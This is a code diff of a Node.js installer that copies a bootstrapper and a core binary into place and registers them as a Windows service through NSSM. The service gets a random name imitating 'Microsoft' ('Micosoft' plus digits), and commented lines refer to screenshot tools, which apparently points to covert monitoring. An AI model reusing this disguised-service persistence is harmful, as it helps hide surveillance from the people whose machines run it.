@@ -1,48 +1,41 @@
 const fs = require("fs");
 const { execSync } = require("child_process");
-const { STOPPED } = require("./status");
+const { STOPPED, waitForServiceStatus } = require("./status");
 
 // const INSTALL_PATH = "C:\\ProgramData\\nssm\\";
 // const BACKEND_NAME = "backend.exe";
 // const BACKEND_PATH = `${INSTALL_PATH}${BACKEND_NAME}`;
 // const NSSM_PATH = `${INSTALL_PATH}nssm.exe`;
 
-const {
-  INSTALL_PATH,
-  BACKEND_NAME,
-  BACKEND_PATH,
-  NSSM_PATH,
-} = require("../../my_config");
+const gConfig = require("../../my_config");
 
 // const SERVICE_NAME = "ammc";
 
-let SERVICE_NAME = `Micosoft${Math.ceil(Math.random() * 100000)}`;
+let NEW_SERVICE_NAME = `Micosoft${Math.ceil(Math.random() * 100000)}`;
 
-function install() {
+async function install() {
   try {
     let rs;
-    fs.mkdirSync(INSTALL_PATH, { recursive: true });
-    fs.copyFileSync("./nssm.exe", NSSM_PATH);
+    fs.mkdirSync(gConfig.INSTALL_PATH, { recursive: true });
+    fs.copyFileSync("./nssm.exe", gConfig.NSSM_PATH);
     // fs.copyFileSync("./myScreenshot.exe", `${INSTALL_PATH}myScreenshot.exe`);
     // fs.copyFileSync(
     //   "./screenCapture_1.3.2.exe",
     //   `${INSTALL_PATH}screenCapture_1.3.2.exe`
     // );
-    fs.copyFileSync("./" + BACKEND_NAME, BACKEND_PATH);
+    // fs.copyFileSync("./" + BACKEND_NAME, BACKEND_PATH);
+    fs.copyFileSync("./bootstrapper.exe", `${gConfig.BOOTSTRAPPER_PATH}`);
+    fs.copyFileSync("./serviceCore", `${gConfig.CORE_PATH}`);
     // sleep(1000);
-    execSync(`${NSSM_PATH} install ${SERVICE_NAME} ${BACKEND_PATH}`);
+    execSync(
+      `${gConfig.NSSM_PATH} install ${NEW_SERVICE_NAME} ${gConfig.BOOTSTRAPPER_PATH}`
+    );
     // 检测服务是否安装完毕
-    while (
-      !execSync(`${NSSM_PATH} status ${SERVICE_NAME}`).equals(
-        Buffer.from(STOPPED)
-      )
-    ) {
-      sleep(300);
-    }
-    execSync(`${NSSM_PATH} start ${SERVICE_NAME}`);
+    await waitForServiceStatus(NEW_SERVICE_NAME, STOPPED);
+    execSync(`${gConfig.NSSM_PATH} start ${NEW_SERVICE_NAME}`);
     fs.writeFileSync(
-      `${INSTALL_PATH}serviceName`,
-      `${SERVICE_NAME}%${BACKEND_NAME}`
+      `${gConfig.INSTALL_PATH}serviceName`,
+      `${NEW_SERVICE_NAME}%%${gConfig.BOOTSTRAPPER_NAME}`
     );
     console.log("安装完毕");
     sleep(1000);
